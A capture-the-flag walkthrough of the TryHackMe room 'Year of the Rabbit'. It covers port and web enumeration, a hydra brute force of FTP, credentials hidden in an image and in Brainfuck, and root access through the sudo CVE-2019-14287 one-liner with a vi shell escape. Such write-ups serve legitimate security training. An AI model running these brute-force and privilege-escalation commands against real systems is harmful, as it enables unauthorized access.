# Year of the Rabbit

On: [TryHackMe](https://tryhackme.com/room/yearoftherabbit)
By: [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)

IP: 10.10.114.28 

# Enum

Let us begin with `nmap`

## Nmap

`nmap -sC -sV -vv -oN nmap.txt 10.10.114.28`

Output: 
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see, we have a web server, ssh and ftp. So I tried a guest connection to ftp and started `nikto` on the web

## Nikto

`nikto -url http://10.10.114.28`

Output:
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.114.28
+ Target Hostname:    10.10.114.28
+ Target Port:        80
+ Start Time:         2021-01-23 16:53:06 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 1ead, size: 59cc3cda1f3a4, mtime: gzip
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-01-23 17:01:18 (GMT-5) (492 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


## Website

The website is the default Apache welcome, so I ran `webctf` my [tool](https://github.com/xnomas/web-ctf-help):

```
$ webctf http://10.10.114.28/

=============
COMMENTS
=============

[+] 1 :        <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>


=============
SCRIPTS
=============


=============
IMAGES
=============

sources:
--------
[+] 1 : /icons/openlogo-75.png

alts:
-----
[+] 1 : Debian Logo

===================
INTERESTING HEADERS
===================

Server : Apache/2.4.10 (Debian)
```
Sadly, nothing much. Time for gobuster!

## Gobuster

`gobuster dir -u http://10.10.114.28/ -w common.txt -t 15` : `common.txt` can be found in the `/usr/share/wordlists/` on Kali.

Output:
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```
and after `common.txt` we can use `directory-list-2.3-medium.txt`, again in the same directory on Kali.

Checking out the `/assets` page, there are two files `RickRolled.mp` and `style.css`. Since I hate stego, I checked out `style.css`

### style.css

And I saw something interesting:
```css
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```
What a nice comment! And yeah, it's obviously a rickroll :)

Running a simple python oneliner to look at the page source and not trigger js:
```python
python -c "import requests; print(requests.get('http://10.10.114.28/sup3r_s3cr3t_fl4g.php').text)"
```
```html
<html>
	<head>
		<title>sup3r_s3cr3t_fl4g</title>
	</head>
	<body>
		<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
		<script>
			alert("Word of advice... Turn off your javascript...");
			window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
		</script>
		<video controls>
			<source src="/assets/RickRolled.mp4" type="video/mp4">
		</video>
	</body>
</html>
```
I'll be honest, I was lost. I started looking online for some guidance, some might say I went down a `rabbit hole` ;) So I tried running nmap again with a script `vuln`

## Second nmap

`nmap -sC -sV -vv --script=vuln 10.10.114.28`

But alas, a dead end. Let's try using `burpsuite`

And play around with the website.

## Burpsuite

So yeah, I tried the secret flag redirect, and voila:
```
HTTP/1.1 302 Found
Date: Sat, 23 Jan 2021 22:16:28 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/R E D A C T E D
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```
We have a new directory to play with. And there we have a `Hot_Babe.png`, so damn... we might have to do some stego afterall.

## Image

I always start with running a few commands on an image: `file` to check if it really is an image, `hexeditor` to check if the format is correct, `strings` to look for hidden strings and if all fails, then I go to an online exif tool or `steghide`. 

Running `strings` we get the following: 

```
Eh, you've earned this. Username for FTP is ftpu***
One of these is the password:
...
...
...
...
```
So now we have a wordlist and a username, time for hydra.

## Hydra

`hydra -l ftpu*** -P passwords.txt 10.10.114.28 ftp`

and again, voila!
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.114.28:21/
[21][ftp] host: 10.10.114.28   login: ftpu***   password: R E D A C T E D
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-23 17:23:28
```

## FTP

run `ls -a` and we have a file called El\*\*\_Creds.txt, use `get FILENAME` to transfer a file back to your host.

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ....
....
....
....
```
Okay, funny language. Look at that `brainfuck`. Use [this decoder](https://www.dcode.fr/brainfuck-language) and we have some ssh creds!

```
User: e***

Password: R E D A C T E D
```

## USER

Time to connect!

On connection we get a welcome message:
```
Message from Root to Gwe*****:

"Gwe*****, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```
Cool, so let's `find` that hiding place: 
`find / -name s3cr3t 2>/dev/null`
Output:
```
/usr/games/s3cr3t/
```
Try looking around there, there is a nice `hidden` file :)
And this is how you get your first flag

## Escalation

So running `sudo -l` as the new user we get this:
```
User gwe****** may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwe******/user.txt
```
So now we look at [gtfobins](https://gtfobins.github.io/) and look for `vi`: 

```
sudo vi -c ':!/bin/sh' /dev/null
```
Cool, let's adapt this for our purposes. Oddly enough, this did not work. Fun tip, use `sudo -V` to get the sudo version ==> 1.8.10p3. Time to google around, and I found two CVE's --> `CVE-2019-14287` and `CVE-2019-18634`, now the first is a simple one liner, so I am definitely trying that:
`sudo -u#-1 id -u`  so for us `sudo -u#-1 /usr/bin/vi /home/gwe******/user.txt` then vi opens up, type `:!/bin/bash` the exclamation mark allows us to execute commands in the command line! We have root!

And with it, our last flag.
